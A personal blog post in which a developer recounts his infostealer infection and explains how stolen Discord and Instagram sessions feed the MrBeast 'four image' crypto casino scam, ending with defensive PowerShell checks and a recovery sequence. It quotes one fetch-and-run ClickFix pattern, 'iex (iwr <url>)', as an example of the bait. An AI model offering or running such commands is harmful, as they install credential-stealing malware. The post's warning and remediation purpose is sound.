---
title: I'm a coder, not a hacker. But this attack followed me for 11 months
description: From one pasted terminal command to the MrBeast "four image" scam hitting my classmates, and how to check your own PC.
date: 2026-11-13
---

## Why I'm writing this

I don't usually write about cybersecurity. I write code. My posts are about what I'm building, what broke in production, and what I learned shipping it.

But 11 months ago I got hacked because of my own curiosity. I wrote about it, cleaned my machine, and thought the story was over. This week it came back, not to me this time, but to my classmates and one of my closest friends. Same scam, same image, same pattern.

So I went down the rabbit hole. I wanted to understand how this actually works, from the first click to that blurry MrBeast screenshot landing in your DMs. This post is what I found. Some of it corrects what I said the first time. Some of it I still don't fully understand, and I'll be honest about that too.

## 11 months ago: one terminal command

If you missed my [first post](https://www.linkedin.com/posts/yvesdc_the-day-i-accidentally-installed-a-rat-while-activity-7404534051233271808-6zdx), here's the short version.

I wanted Adobe After Effects for free. A few installers failed. Then I found a YouTube video with a "simple terminal command" to install it. As a developer I love installing things from the terminal, so I copied it and ran it. It downloaded a second script, and I ran that too. Nothing happened, so I went back to coding.

Minutes later my screen started glitching, like someone else was using my PC. A server admin messaged me: "Bro, what the hell are you sending in my server?" Discord locked my account for my safety. By then every contact and every server I was in had received crypto scam messages. Instagram was next. Then LinkedIn, then sign-in attempts on my banking app. One login came from Nova Iguaçu, Brazil. I'm in Rwanda.

I changed passwords, turned on MFA everywhere, and spent the night wiping my PC and reinstalling Windows. I called it a RAT and wrote: _you can hack yourself through your own curiosity._ That part I still stand by.

## This week: it came back through my classmates

I run a Discord server for about 40 classmates. Most of them didn't even have Discord before; I asked them to create accounts and join. Half a year later, I started seeing them post the same thing, one by one: low-quality photos of a monitor showing a fake MrBeast tweet.

The "tweet" announces his own crypto casino. It promises $2,500 to everyone who registers, gives a site and a promo code, and warns that the post will be deleted in one hour. Then comes a photo of someone entering the code, and a big green screen showing the money withdrawn.

![The four-image scam as it landed in our Discord server: a fake MrBeast tweet, a casino bonus page with a promo code, and two "Withdrawal Success" screens. The sender's name is blurred.](/blog/four-image-scam.png)

If you see this, don't type the site into your browser, even out of curiosity. The images change a little each wave, but the pattern stays the same.

Then a close friend's Instagram started sending it too. Not through Discord. Through an Instagram session saved on his PC. He told me he hadn't installed anything or clicked anything suspicious. He started to wonder if the image itself carried a hidden link.

That's the question that pushed me to dig: **if he didn't do anything, how did it get him?** And if the image spreads it, how did the first person ever get hit?

It turns out this scam has a name. Researchers and moderators call it the Discord crypto casino scam, or the "four image" scam. In mid-2026 there was a wave where hacked accounts sent the screenshots with a message that just said "Bro", and Discord tracking platform RaidProtect estimated tens of thousands of accounts were compromised in 2026 alone ([Cyber Daily](https://www.cyberdaily.au/security/13878-bro-a-wave-of-discord-account-takeovers-is-spreading-a-mrbeast-crypto-scam)).

## The chain: from one click to that MrBeast image

Here's the short answer to my friend's question: **the image is not the virus.** Viewing it can't infect you. The image is the ad. The hack happened earlier, on each victim's own computer, and it was sold. Here is the whole chain as I now understand it.

![The infostealer loop: a traffer posts bait, you run it, a stealer copies your sessions, the log is sold, bots replay the sessions, and the four-image scam is sent to your friends, some of whom get infected next.](/blog/infostealer-loop.svg)

### Stage 1: someone gets paid to infect you

Nobody "hacked Discord." There is an organized industry behind this. The people who spread the malware are called **traffers**. They join teams on forums and Telegram, get a ready-made malware kit, and earn a cut of what's stolen. Their main job: make fake YouTube tutorials and scam pages that convince you to run the malware ([The Hacker News](https://thehackernews.com/2024/07/10000-victims-day-infostealer-garden-of.html)). Some even use hijacked YouTube channels with real subscribers so the video looks trustworthy ([Red Sky Alliance](https://redskyalliance.org/xindustry/traffers-youtube-video-tutorials)).

That answers "how did the first person get hit." There is no patient zero. Thousands of people get infected independently, every day, by bait like this.

### Stage 2: the bait (how people actually get exposed)

The current reports point to a handful of doors:

- **Cracked software and keygens.** Still the top vector in AhnLab's 2026 monthly reports ([May 2026](https://radar.offseq.com/threat/may-2026-infostealer-trend-report-1c95dbd7c22c3b9d)).
- **Game cheats and mods.** In one 2025 analysis of 50,000 infected devices, 41% of infections came from fake mods or cheats ([baseVISION](https://www.basevision.ch/content/uploads/2026/04/TI-Report-1225-Infostealer-Malware-The-Silent-Credential-Harvesting-Epidemic-1-1.pdf)).
- **"Paste this command" videos and pages, called ClickFix.** That was me. The commands look like `iex (iwr <url>)` and pull a second script ([WithSecure](https://www.withsecure.com/fi/resurssit/w-labs/clickfix-social-media/)). ESET saw ClickFix grow about 500% in early 2025.
- **Fake "try my game" files from a friend's hacked account**, fake Nitro gifts, and QR codes that log the scammer into your account.
- **Malicious browser extensions.** This is the quiet one. Extensions named things like "Unlock Discord" or "Volume Max" were caught spying on users ([Malwarebytes](https://www.malwarebytes.com/?p=270607)).

One study of 170,298 infostealer victims found the highest infection rates per internet user are in Asia, Africa, Latin America and Eastern Europe, with gamers overrepresented ([arXiv, 2026](https://arxiv.org/html/2609.30070v1)). That's us.

### Stage 3: the malware grabs your sessions (no hacker watching needed)

I used to think stealing sessions meant someone was remotely controlling my PC. Mostly, it doesn't. The malware is called an **infostealer**. Many are smash-and-grab: they run once, copy your data, send it off, and delete themselves ([DeepStrike](https://deepstrike.io/blog/infostealer-malware-credential-theft-2025)).

What they copy: saved browser passwords, **session cookies** (the thing that keeps you logged in), autofill, crypto wallets. Chrome added encryption to protect cookies in 2024, but stealers got around it within about 45 days ([SpyCloud](https://spycloud.com/blog/infostealers-bypass-new-chrome-security-feature/)). Discord's desktop app is a separate target: some malware edits Discord's own files so it steals your token every time you open it ([Wccftech](https://wccftech.com/discord-anarchygrabber-malware-check-removal/amp/)).

Some kits do add real remote control, a hidden desktop the attacker can use without you seeing it ([Help Net Security](https://www.helpnetsecurity.com/?p=262319)).

### Stage 4: your data becomes a product

Everything stolen from one PC is packed into a **stealer log**. Within 24 to 48 hours it's listed on markets like Russian Market or 2easy ([CybelAngel](https://cybelangel.com/ja/%e3%83%96%e3%83%ad%e3%82%b0/infostealer-logs-after-their-stolen-criminal-economy-data/)), or dumped in bulk on Telegram. Basic logs sell for a few dollars. Logs with banking access sell for much more: about $112 versus $14 on one market ([Flare](https://flare.io/?p=8941)). That explains the attempts on my bank.

### Stage 5: buyers replay your session and skip MFA

A session cookie is proof that a login already happened. Replay it, and the site thinks it's you. No password, no MFA prompt ([DarkOwl](https://www.darkowl.com/blog-content/stealer-logs-the-underground-commodity-powering-modern-cybercrime/)). On Discord, logging out doesn't even kill the token; only a password change does ([yal.cc](https://yal.cc/?p=1535)). So a token stolen months ago can still work today.

### Stage 6: the four-image scam

The buyers don't care about you personally. They load thousands of stolen accounts into bots and blast the fake MrBeast casino to every friend list and server ([ProPakistani](https://propakistani.pk/2026/06/18/countless-pakistani-discord-accounts-hacked-in-dangerous-money-stealing-scam/)). Because it comes from a real friend, people trust it. The images are photos of a screen so they slip past text filters.

The money part is old-school: you register, see a fake $2,500 balance, and to withdraw it you're asked to pay a "verification" or "VIP" fee. That's where victims actually lose money ([TechJuice](https://www.techjuice.pk/?p=240197)).

And then the loop closes. Some of the people reached by those hacked accounts get sent a "try my game" file or a QR code, get infected, and become the next batch of accounts.

## What I got wrong in my first post

**"MFA saved every single one of my accounts."** Half true. MFA blocked the later attempts that used my stolen _passwords_, like the login from Brazil. But the first takeover didn't need my password. They replayed my already-logged-in sessions, and a session cookie skips MFA completely. That's how my Discord and Instagram were spamming while MFA was on.

**"A RAT was inside my system."** Maybe partly. The core of what happened looks like an infostealer: grab sessions and passwords, sell them, let bots spam. My screen glitching could have been the malware killing and relaunching my apps to pull data. Some stealers do exactly that, killing Chrome or Discord and restarting it ([CyberInsider](https://cyberinsider.com/?p=30698), [HTB write-up](https://hexpysya.github.io/investigations/htb-subatomic/)). It could also have been real remote control. I can't prove which.

**The order of my steps.** I changed passwords _before_ wiping my PC. If the malware was still running, it could have grabbed the new ones too. That may explain why attempts kept coming. The right order: clean or disconnect the machine first, then change passwords from a clean device, then log out every session.

## What I'm still not sure about

I want to be straight: I don't know exactly how each of my classmates got hit. Here's where my understanding stops.

- **Was it me?** Probably not directly. My Discord was cleaned 11 months ago. The more likely story is that each person's own device got infected somewhere (a crack, a cheat, a pasted command, an extension), and their logs were bought by the same kind of spam operation. My server just made it visible because we were all in one place.
- **My friend who "installed nothing."** If his saved Instagram session on his PC is posting spam, the most likely explanation is that the PC or the browser leaked it. Maybe a forgotten crack or mod, maybe an extension. But I can't say for sure without looking at his machine.
- **Is my old log still being resold?** Possibly. Logs get resold. But after the wipe, new passwords and logging out every session, what's in it should be useless.

**If this has happened to you, I'd really like to hear how.** What did you install or click before it started? How long until you noticed? Did anything stop it? Message me on [LinkedIn](https://linkedin.com/in/yvesdc) or [X](https://x.com/YvesDC0). The more real cases we put together, the clearer the picture gets for everyone. And if you work in security and see something I got wrong, please correct me. I'm a coder learning this in public.

## Check yourself: commands you can run

These are for Windows. Open **PowerShell as Administrator** (right-click Start, then Terminal (Admin)). Yes, I see the irony of telling you to paste commands after this story. That's the point: read each one, understand what it does, and only then run it. None of these download anything.

First, if you think you're infected right now, **disconnect from Wi-Fi.** That cuts any live remote session.

**1. Update Defender and run a full scan.**

```powershell
Update-MpSignature
Start-MpScan -ScanType FullScan
```

**2. Run an offline scan.** This restarts your PC and scans before Windows loads, so malware can't hide ([Engadget](https://www.engadget.com/2257817/best-way-check-pc-malware/)). Save your work first.

```powershell
Start-MpWDOScan
```

**3. See what Defender has found in the past.**

```powershell
Get-MpThreatDetection | Select-Object InitialDetectionTime, ThreatID, Resources
```

**4. Check Discord's files for injected code.** A clean `index.js` holds one line: `module.exports = require('./core.asar');` ([Tripwire](https://tripwire.com/state-of-security/updated-anarchygrabber-steals-passwords-spreads-to-discord-friends)). Anything else means uninstall Discord and reinstall it from discord.com.

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Discord" -Recurse -Filter index.js |
  Where-Object FullName -match 'discord_desktop_core' |
  ForEach-Object { "== $($_.FullName)"; Get-Content $_.FullName }
```

**5. Check if Chrome's cookie protection was switched off.** Some malware sets a policy to disable it. A value of `0` means it was disabled; "not found" or `1` is normal ([Red Canary](https://redcanary.com/blog/threat-intelligence/google-chrome-app-bound-encryption/)).

```powershell
reg query "HKLM\Software\Policies\Google\Chrome" /v ApplicationBoundEncryptionEnabled
reg query "HKCU\Software\Policies\Google\Chrome" /v ApplicationBoundEncryptionEnabled
reg query "HKLM\Software\Policies\Microsoft\Edge" /v ApplicationBoundEncryptionEnabled
```

**6. Look for Chrome running in "remote debugging" mode.** Stealers use this trick to read cookies ([Zscaler](https://www.zscaler.com/jp/blogs/cybersecurity-best-practices/google-chrome-app-bound-encryption)). Normally this returns nothing.

```powershell
Get-CimInstance Win32_Process -Filter "Name='chrome.exe' OR Name='msedge.exe'" |
  Where-Object CommandLine -match 'remote-debugging' |
  Select-Object ProcessId, CommandLine
```

**7. List what starts automatically.** Look for unfamiliar names, especially anything running from `AppData`, `ProgramData` or `Temp`.

```powershell
Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location
Get-ScheduledTask | Where-Object TaskPath -notlike '\Microsoft\*' |
  Select-Object TaskName, TaskPath, State
```

For a deeper look, use **Autoruns** from Microsoft Sysinternals. Run it as admin, hide signed Microsoft entries, and turn on the VirusTotal check ([Flamingo](https://www.flamingo.run/blog/how-to-remove-malware-from-pc)).

**8. See which programs are talking to the internet.**

```powershell
Get-NetTCPConnection -State Established |
  Select-Object RemoteAddress, RemotePort,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName}} |
  Sort-Object Process
```

A browser, Discord or Spotify here is normal. A random name you don't recognize is worth searching.

**9. Get a second opinion.** Run Malwarebytes Free or ESET Online Scanner. Different engines catch different things.

**10. Check your browser extensions.** Open `chrome://extensions` and remove anything you don't use or don't recognize.

**11. Check if your email is in stealer logs.** Search your address on [Have I Been Pwned](https://haveibeenpwned.com/) and subscribe to notifications. HIBP now indexes stealer logs, including 284 million accounts from one Telegram dump ([BleepingComputer](https://www.bleepingcomputer.com/news/security/have-i-been-pwned-adds-284m-accounts-stolen-by-infostealer-malware/)).

**The honest caveat:** a clean result is not proof. Each stealer build can be unique, so antivirus can miss it. If you ran a crack, a cheat or a pasted command and something feels off, reinstalling Windows is the only sure fix. That's what I did.

## If you're already hit: do it in this order

The order matters more than the speed. Here's what I'd do today:

1. **Clean the PC first.** Disconnect it, scan offline, or reinstall Windows. Changing passwords on an infected machine just hands over the new ones.
2. **From a clean device (your phone), secure your email first.** Your email resets everything else.
3. **Change passwords, then log out of every session.** On Discord, a password change kills old tokens ([LastPass](https://blog.lastpass.com/posts/forgot-your-discord-password)). On Instagram, Google and LinkedIn, use "log out of all sessions" explicitly.
4. **Remove authorized apps.** On Discord, apps you approved keep their own tokens even after a password change ([Tickety](https://tickety.top/blog/discord-account-hacked-recovery)). Check Settings, Authorized Apps.
5. **Developers: rotate secrets, not just passwords.** GitHub and npm tokens, API keys, SSH keys, `.env` files. Stealers grab those too. If work credentials were on that machine, tell your team.
6. **Call your bank** if banking apps or saved cards were on that PC.
7. **Tell your friends by phone or WhatsApp,** not by DM from the hacked account: "If you got a MrBeast casino image from me, it wasn't me. Don't open the site."

Going forward: no cracks, cheats or pasted commands. Use a password manager instead of saving passwords in the browser. Keep few extensions. Keep Chrome updated: Chrome 146 on Windows added Device Bound Session Credentials, which ties cookies to your hardware so a stolen copy becomes useless on sites that support it ([Google](https://blog.google/security/protecting-cookies-with-device-bound-session-credentials/?hl=en)).

## Closing

When I started digging, I expected to find some clever hacker targeting my class. What I found is more boring and more scary: a supply chain. Someone gets paid to post a fake tutorial. Someone runs it. A log gets sold for a few dollars. A bot uses it to send a blurry MrBeast photo to everyone you know.

None of it needs genius. It just needs one of us to be curious, in a hurry, or trying to save money on software.

So if you get that image from a friend, don't be angry at them. They're not scamming you. They got hacked. Call them, send them this post, and check your own machine while you're at it.

Back to coding next week. But I'm glad I wrote this one.

## Sources

- [Cyber Daily: "Bro!" wave of Discord takeovers spreading MrBeast scam](https://www.cyberdaily.au/security/13878-bro-a-wave-of-discord-account-takeovers-is-spreading-a-mrbeast-crypto-scam)
- [Bitdefender: Stolen Discord accounts spread fake MrBeast giveaways](https://www.bitdefender.com/en-us/blog/hotforsecurity/hackers-are-using-stolen-discord-accounts-to-spread-fake-mrbeast-giveaways)
- [ProPakistani: Discord accounts hacked in MrBeast scam](https://propakistani.pk/2026/06/18/countless-pakistani-discord-accounts-hacked-in-dangerous-money-stealing-scam/)
- [TechJuice: MrBeast Discord scam](https://www.techjuice.pk/?p=240197)
- [The Hacker News: 10,000 victims a day, traffer teams](https://thehackernews.com/2024/07/10000-victims-day-infostealer-garden-of.html)
- [Red Sky Alliance: Traffers and YouTube tutorials](https://redskyalliance.org/xindustry/traffers-youtube-video-tutorials)
- [arXiv: A Data-Driven Analysis of Infostealer Malware Victims (2026)](https://arxiv.org/html/2609.30070v1)
- [AhnLab via Offseq: May 2026 Infostealer Trend Report](https://radar.offseq.com/threat/may-2026-infostealer-trend-report-1c95dbd7c22c3b9d)
- [baseVISION: Infostealer malware report](https://www.basevision.ch/content/uploads/2026/04/TI-Report-1225-Infostealer-Malware-The-Silent-Credential-Harvesting-Epidemic-1-1.pdf)
- [WithSecure: ClickFix commands disguised as tech tips](https://www.withsecure.com/fi/resurssit/w-labs/clickfix-social-media/)
- [Malwarebytes: Malicious extensions in Chrome and Edge](https://www.malwarebytes.com/?p=270607)
- [DeepStrike: Top infostealer malware](https://deepstrike.io/blog/infostealer-malware-credential-theft-2025)
- [SpyCloud: Infostealers bypass Chrome security](https://spycloud.com/blog/infostealers-bypass-new-chrome-security-feature/)
- [CyberInsider: How stealers bypass Chrome cookie encryption](https://cyberinsider.com/?p=30698)
- [HTB Subatomic investigation: Discord injection](https://hexpysya.github.io/investigations/htb-subatomic/)
- [Wccftech: Check your Discord client for a trojan](https://wccftech.com/discord-anarchygrabber-malware-check-removal/amp/)
- [Tripwire: AnarchyGrabber and Discord index.js](https://tripwire.com/state-of-security/updated-anarchygrabber-steals-passwords-spreads-to-discord-friends)
- [Help Net Security: Infostealer with hidden remote desktop](https://www.helpnetsecurity.com/?p=262319)
- [CybelAngel: What happens to stolen credentials](https://cybelangel.com/ja/%e3%83%96%e3%83%ad%e3%82%b0/infostealer-logs-after-their-stolen-criminal-economy-data/)
- [Flare: Stealer logs and prices](https://flare.io/?p=8941)
- [DarkOwl: Stealer logs](https://www.darkowl.com/blog-content/stealer-logs-the-underground-commodity-powering-modern-cybercrime/)
- [yal.cc: Discord token behavior](https://yal.cc/?p=1535)
- [LastPass: Discord password and tokens](https://blog.lastpass.com/posts/forgot-your-discord-password)
- [Tickety: Discord hacked account recovery](https://tickety.top/blog/discord-account-hacked-recovery)
- [Red Canary: Chrome app-bound encryption](https://redcanary.com/blog/threat-intelligence/google-chrome-app-bound-encryption/)
- [Zscaler: Stealers bypass app-bound encryption](https://www.zscaler.com/jp/blogs/cybersecurity-best-practices/google-chrome-app-bound-encryption)
- [Engadget: How to check your PC for malware](https://www.engadget.com/2257817/best-way-check-pc-malware/)
- [Flamingo: Remove malware from a PC](https://www.flamingo.run/blog/how-to-remove-malware-from-pc)
- [BleepingComputer: HIBP adds 284M stealer log accounts](https://www.bleepingcomputer.com/news/security/have-i-been-pwned-adds-284m-accounts-stolen-by-infostealer-malware/)
- [Google: Device Bound Session Credentials](https://blog.google/security/protecting-cookies-with-device-bound-session-credentials/?hl=en)
